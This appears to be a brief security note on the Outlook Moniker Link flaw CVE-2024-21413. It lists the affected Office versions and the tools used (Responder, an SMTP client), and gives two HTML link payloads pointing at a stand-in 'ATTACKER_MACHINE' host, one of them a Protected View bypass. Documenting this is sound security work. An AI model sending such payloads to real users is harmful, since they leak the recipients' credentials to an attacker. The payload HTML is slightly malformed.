## Moniker Link CVE-2024-21413

### Tool: Responder, SMTP client

### Severity: Critical

### Scoring: 9.8

### MS Article: https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2024-21413https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2024-21413

### Affected MS Office releases:

#### 1) Microsoft Office LTSC 2021	(Version: from 19.0.0)

#### 2) Microsoft 365 Apps for Enterprise (Version: from 16.0.1)

#### 3) Microsoft Office 2019 (Version: from 16.0.1)

#### 4) Microsoft Office 2016 (Version: from 16.0.0 before 16.0.5435.1001)

### Example payload: (Moniker Link type: file://)

#### 1) <p><a href="file://ATTACKER_MACHINE/test"<Click me</a></p<

### Outlook's Protected view bypass: (Special character: !)

#### 1) <p><a href="file://ATTACKER_MACHINE/test!exploit"<Click me</a></p<

